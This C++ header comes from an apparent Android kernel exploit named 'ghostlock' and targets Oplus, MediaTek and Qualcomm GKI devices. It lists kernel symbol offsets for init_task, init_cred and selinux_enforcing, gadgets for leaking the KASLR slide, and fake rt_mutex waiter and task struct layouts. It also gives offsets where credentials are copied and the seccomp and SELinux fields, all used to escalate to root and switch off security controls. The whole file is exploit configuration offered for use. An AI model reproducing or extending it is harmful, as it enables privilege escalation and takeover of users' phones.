/**
 * @file target.h
 * @brief 43499 核心的按用途头（由 core.cpp 拆分，声明/内联逐字保留）。
 */
#ifndef GHOSTLOCK_CORE_TARGET_H
#define GHOSTLOCK_CORE_TARGET_H

/* ==== kernel/target_constants.hpp ==== */
#ifndef GHOSTLOCK_TARGET_CONSTANTS_HPP
#define GHOSTLOCK_TARGET_CONSTANTS_HPP

#include <cstddef>
#include <cstdint>
#include <limits>
#include <optional>
#include <type_traits>

namespace ghostlock::target {
    namespace address {
        inline constexpr std::uintptr_t kImageTextBase = 0xffffffc008000000ULL;
        inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kPageOffset = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
                0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd =
                0xffffff8c00000000ULL;
        inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
        inline constexpr std::uintptr_t kVmemmapStart = 0xfffffffe00000000ULL;
    } // namespace address

    namespace payload {
        inline constexpr std::size_t kLockOffset = 0x0e80;
        inline constexpr std::size_t kWaiterOffset = 0x1180;
        inline constexpr std::size_t kFileOperationsOffset = 0x0f80;
        inline constexpr std::size_t kRightNodeOffset = 0x1240;
        inline constexpr std::size_t kLeftNodeOffset = 0x1260;
        inline constexpr std::size_t kFakeTaskOffset = 0x1280;
        inline constexpr std::size_t kCredentialCopyOffset = 0x1080;
        inline constexpr std::size_t kTcpFakeTaskOffset = 0x5800;
        inline constexpr std::size_t kTcpCredentialCopyOffset = 0x6800;
    } // namespace payload

    template<typename Domain>
    class KernelAddress final {
    public:
        constexpr KernelAddress() noexcept = default;

        explicit constexpr KernelAddress(std::uintptr_t value) noexcept
            : value_(value) {
        }

        [[nodiscard]] constexpr std::uintptr_t value() const noexcept {
            return value_;
        }

        [[nodiscard]] constexpr std::optional<KernelAddress> checked_add(
            std::uintptr_t offset) const noexcept {
            if (offset > std::numeric_limits<std::uintptr_t>::max() - value_) {
                return std::nullopt;
            }
            return KernelAddress(value_ + offset);
        }

        friend constexpr bool operator==(KernelAddress, KernelAddress) = default;

    private:
        std::uintptr_t value_ = 0;
    };

    struct ImageAddressDomain final {
    };

    struct DirectMapAddressDomain final {
    };

    struct PhysicalAddressDomain final {
    };

    static_assert(std::is_standard_layout_v<KernelAddress<ImageAddressDomain> >);
    static_assert(std::is_trivially_copyable_v<KernelAddress<ImageAddressDomain> >);
    static_assert(sizeof(KernelAddress<ImageAddressDomain>) == sizeof(std::uintptr_t));
    static_assert(alignof(KernelAddress<ImageAddressDomain>) == alignof(std::uintptr_t));

    static_assert(address::kImageTextBase == 0xffffffc008000000ULL);
    static_assert(address::kMtkVirtualBase == 0xffffffc000000000ULL);
    static_assert(address::kPageOffset == address::kDirectMapBase);
    static_assert(address::kKernelSnitchIdentityStart == address::kDirectMapBase);
    static_assert(address::kKernelSnitchIdentityEnd < address::kDirectMapEnd);
    static_assert(payload::kLockOffset == 0x0e80);
    static_assert(payload::kFileOperationsOffset == 0x0f80);
    static_assert(payload::kCredentialCopyOffset == 0x1080);
    static_assert(payload::kWaiterOffset == 0x1180);
    static_assert(payload::kRightNodeOffset == 0x1240);
    static_assert(payload::kLeftNodeOffset == 0x1260);
    static_assert(payload::kFakeTaskOffset == 0x1280);
    static_assert(payload::kTcpFakeTaskOffset == 0x5800);
    static_assert(payload::kTcpCredentialCopyOffset == 0x6800);
} // namespace ghostlock::target

#endif
/* ==== kernel/target.h ==== */
#ifndef TARGET_H
#define TARGET_H


/* Compiled-in target geometry, functionized into ghostlock::kernel.
 *
 * The values fall into three groups: address-layout and payload-slot values
 * forwarded from target_constants.hpp, device/profile defaults, and the
 * symbol/slide/struct offsets that the profile may override through the
 * runtime_struct_offsets.h accessors. Nothing here is a second authority; a
 * resolved profile still wins wherever a value is optional. */

namespace ghostlock::kernel {
    inline constexpr const char *BUILD_VARIANT_LABEL = "ghostlock_oplus";

    /* Kernel address layout. */
    inline constexpr std::uintptr_t KIMAGE_TEXT_BASE = target::address::kImageTextBase;
    inline constexpr std::uintptr_t MTK_VADDR_BASE = target::address::kMtkVirtualBase;
    inline constexpr std::uintptr_t P0_PAGE_OFFSET = target::address::kPageOffset;
    inline constexpr std::uintptr_t P0_PHYS_OFFSET = target::address::kPhysicalOffset;
    inline constexpr std::uintptr_t KERNELSNITCH_IDENTITY_START =
            target::address::kKernelSnitchIdentityStart;
    inline constexpr std::uintptr_t KERNELSNITCH_IDENTITY_END =
            target::address::kKernelSnitchIdentityEnd;
    inline constexpr std::uintptr_t DIRECT_MAP_BASE = target::address::kDirectMapBase;
    inline constexpr std::uintptr_t DIRECT_MAP_END = target::address::kDirectMapEnd;
    inline constexpr std::uintptr_t VMEMMAP_START = target::address::kVmemmapStart;

    /* Device/profile defaults. */
    inline constexpr unsigned long long P0_KERNEL_PHYS_LOAD = 0xa8000000ULL;
    inline constexpr unsigned long long QC_GKI_6_12_PHYS_LOAD = 0xc7800000ULL;
    inline constexpr unsigned long long XRING_KERNEL_PHYS_LOAD = 0x80200000ULL;

    /* Symbol offsets. */
    inline constexpr unsigned long long INIT_TASK_OFF = 0x0211e280ULL;
    inline constexpr unsigned long long INIT_CRED_OFF = 0x02130748ULL;
    inline constexpr unsigned long long ROOT_TASK_GROUP_OFF = 0x02317580ULL;
    inline constexpr unsigned long long SELINUX_ENFORCING_OFF = 0x02358ee0ULL;
    inline constexpr unsigned long long SELINUX_BLOB_SIZES_OFF = 0x0167b5d0ULL;
    inline constexpr unsigned long long SECURITY_HOOK_HEADS_OFF = 0x00000000ULL;

    /* KASLR leak symbols. */
    inline constexpr unsigned long long SLIDE_NFULNL_LOGGER_OFF = 0x02112260ULL;
    inline constexpr unsigned long long SLIDE_LOGGERS_0_1_OFF = 0x021121b0ULL;
    inline constexpr unsigned long long SLIDE_RANDOM_BOOT_ID_DATA_OFF = 0x02379ed8ULL;
    inline constexpr unsigned long long SLIDE_SYSCTL_BOOTID_OFF = 0x02379ed8ULL;

    /* Kernel addresses. */
    inline constexpr unsigned long long INIT_TASK = KIMAGE_TEXT_BASE + INIT_TASK_OFF;
    inline constexpr unsigned long long INIT_CRED = KIMAGE_TEXT_BASE + INIT_CRED_OFF;
    inline constexpr unsigned long long ROOT_TASK_GROUP =
            KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF;
    inline constexpr unsigned long long SELINUX_ENFORCING =
            KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF;
    inline constexpr unsigned long long SELINUX_BLOB_SIZES =
            KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF;
    inline constexpr unsigned long long SECURITY_HOOK_HEADS =
            KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF;
    inline constexpr unsigned long long SLIDE_NFULNL_LOGGER_IMAGE =
            KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF;
    inline constexpr unsigned long long SLIDE_LOGGERS_0_1_IMAGE =
            KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF;
    inline constexpr unsigned long long SLIDE_RANDOM_BOOT_ID_DATA_IMAGE =
            KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF;
    inline constexpr unsigned long long SLIDE_INIT_TASK_IMAGE =
            KIMAGE_TEXT_BASE + INIT_TASK_OFF;
    inline constexpr unsigned long long SLIDE_ROOT_TASK_GROUP_IMAGE =
            KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF;
    inline constexpr unsigned long long SLIDE_SYSCTL_BOOTID_IMAGE =
            KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF;

    inline constexpr int32_t PSELECT_WAITER_WORD_SHIFT = -2;

    /* Fake waiter and task layouts. */
    inline constexpr int32_t FAKE_WAITER_TREE_PRIO_OFF = 0x18;
    inline constexpr int32_t FAKE_WAITER_TREE_DEADLINE_OFF = 0x20;
    inline constexpr int32_t FAKE_WAITER_PI_TREE_ENTRY_OFF = 0x28;
    inline constexpr int32_t FAKE_WAITER_PI_TREE_PRIO_OFF = 0x40;
    inline constexpr int32_t FAKE_WAITER_PI_TREE_DEADLINE_OFF = 0x48;
    inline constexpr int32_t FAKE_WAITER_TASK_OFF = 0x50;
    inline constexpr int32_t FAKE_WAITER_LOCK_OFF = 0x58;
    inline constexpr int32_t FAKE_WAITER_WAKE_STATE_OFF = 0x60;
    inline constexpr int32_t FAKE_WAITER_WW_CTX_OFF = 0x68;

    inline constexpr int32_t FAKE_TASK_USAGE_OFF = 0x40;
    inline constexpr int32_t FAKE_TASK_PRIO_OFF = 0x84;
    inline constexpr int32_t FAKE_TASK_NORMAL_PRIO_OFF = 0x8c;
    inline constexpr int32_t FAKE_TASK_TASK_GROUP_OFF = 0x348;
    inline constexpr int32_t FAKE_TASK_PI_LOCK_OFF = 0x90c;
    inline constexpr int32_t FAKE_TASK_PI_WAITERS_OFF = 0x920;
    inline constexpr int32_t FAKE_TASK_PI_TOP_TASK_OFF = 0x930;
    inline constexpr int32_t FAKE_TASK_PI_BLOCKED_ON_OFF = 0x938;

    inline constexpr int32_t TASK_PID_OFF = 0x618;
    inline constexpr int32_t TASK_TGID_OFF = 0x61c;
    inline constexpr int32_t TASK_ATOMIC_FLAGS_OFF = 0x5d8;
    inline constexpr int32_t TASK_REAL_CRED_OFF = 0x818;
    inline constexpr int32_t TASK_CRED_OFF = 0x820;
    inline constexpr int32_t TASK_COMM_OFF = 0x830;
    inline constexpr int32_t TASK_TASKS_OFF = 0x550;
    inline constexpr int32_t TASK_THREAD_INFO_FLAGS_OFF = 0x00;
    inline constexpr int32_t TASK_SECCOMP_OFF = 0x8e8;

    inline constexpr int32_t CRED_UID_OFF = 8;
    inline constexpr int32_t CRED_SECUREBITS_OFF = 40;
    inline constexpr int32_t CRED_CAPS_OFF = 48;
    inline constexpr int32_t CRED_SECURITY_OFF = 128;
    inline constexpr int32_t SELINUX_CRED_BLOB_OFF = 0;
    inline constexpr int32_t SELINUX_CRED_OSID_OFF = 0;
    inline constexpr int32_t SELINUX_CRED_SID_OFF = 4;
    inline constexpr int32_t SECCOMP_MODE_OFF = 0x00;
    inline constexpr int32_t SECCOMP_FILTER_COUNT_OFF = 0x04;
    inline constexpr int32_t SECCOMP_FILTER_OFF = 0x08;
    inline constexpr int32_t TIF_SECCOMP_BIT = 11;
    inline constexpr int32_t PFA_NO_NEW_PRIVS_BIT = 0;

    inline constexpr int32_t STRUCT_PAGE_SIZE = 0x40;
    inline constexpr int32_t STRUCT_PAGE_COMPOUND_HEAD_OFF = 0x08;
    inline constexpr int32_t STRUCT_SLAB_CACHE_OFF = 0x08;
    inline constexpr int32_t STRUCT_PAGE_TYPE_OFF = 0x30;

    inline constexpr std::size_t LOCK_OFF = target::payload::kLockOffset;
    inline constexpr std::size_t W0_OFF = target::payload::kWaiterOffset;
    inline constexpr std::size_t FOPS_OFF = target::payload::kFileOperationsOffset;
    inline constexpr std::size_t RIGHT_OFF = target::payload::kRightNodeOffset;
    inline constexpr std::size_t LEFT_OFF = target::payload::kLeftNodeOffset;
    inline constexpr std::size_t FAKE_TASK_OFF = target::payload::kFakeTaskOffset;

    /* W2 payload. */
    inline constexpr std::size_t CRED_COPY_OFF = target::payload::kCredentialCopyOffset;

    /* TCP zerocopy payload offsets: fake_task sits at 0x5800 so it clears the
 * fake_lock rb_leftmost zone; the cred copy follows because the pselect
 * 0x1080 slot would land inside fake_task. */
    inline constexpr std::size_t TCP_FAKE_TASK_OFF =
            target::payload::kTcpFakeTaskOffset;
    inline constexpr std::size_t TCP_CRED_COPY_OFF =
            target::payload::kTcpCredentialCopyOffset;
} // namespace ghostlock::kernel

#endif
/* ==== kernel/constants.hpp ==== */
#ifndef GHOSTLOCK_KERNEL_CONSTANTS_HPP
#define GHOSTLOCK_KERNEL_CONSTANTS_HPP

#include <cstdint>


namespace ghostlock::kernel {
    inline constexpr unsigned PAGE_SHIFT = 12;
    inline constexpr unsigned long PAGE_SIZE = 1UL << PAGE_SHIFT;
    inline constexpr unsigned KS_PAGE_SIZE = 4096;
    inline constexpr unsigned long long KS_PAGE_MASK = 0xfffULL;

    inline constexpr long long SKB_DATA_DELTA = -0xe80LL;
    inline constexpr unsigned long MM_STRUCT_SZ = 0x500;

    inline constexpr unsigned MM_ORDER = 3;
    inline constexpr unsigned MM_PARTIALS = 5;

    inline constexpr unsigned long ORDER3_SIZE = PAGE_SIZE << MM_ORDER;
    inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
    inline constexpr unsigned SKB_RECLAIM_SENDS = 4;
    inline constexpr unsigned long FOPS_TABLE_OFF = FOPS_OFF;
    inline constexpr int32_t SKB_FRAG_BIAS = 0;

    inline constexpr int32_t FAKE_TASK_PRIO = 120;
    inline constexpr int32_t FAKE_WAITER_PRIO = 140;
    inline constexpr unsigned FAKE_TASK_UCLAMP_REQ_OFF = 0x350;
    inline constexpr unsigned FAKE_TASK_UCLAMP_OFF = 0x358;
    inline constexpr unsigned FAKE_UCLAMP_ACTIVE_BIT = 16;
    inline constexpr unsigned FAKE_UCLAMP_MIN_ACTIVE = 1U << FAKE_UCLAMP_ACTIVE_BIT;
    inline constexpr unsigned FAKE_UCLAMP_MAX_ACTIVE =
            (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT));

    inline constexpr unsigned TASK_COMM_LEN = 16;

    /* `select_stack_route.h` keeps a host-safe fallback macro under this name, so a
 * TU that includes it before common.h must not also declare the constexpr. */
#ifndef PSELECT_ROUTE_NFDS
    inline constexpr unsigned PSELECT_ROUTE_NFDS = 320;
#endif
    inline constexpr int32_t PSELECT_CONSUMER_NICE = 19;
    inline constexpr unsigned PSELECT_CONSUMER_SETTLE_USEC = 250000;

    struct local_sched_attr {
        uint32_t size;
        uint32_t sched_policy;
        uint64_t sched_flags;
        int32_t sched_nice;
        uint32_t sched_priority;
        uint64_t sched_runtime;
        uint64_t sched_deadline;
        uint64_t sched_period;
    };

    /* Measured direct-map end (defaults to the built-in bound). */
    extern uint64_t g_direct_map_end;
} // namespace ghostlock::kernel

#endif

#endif // GHOSTLOCK_CORE_TARGET_H
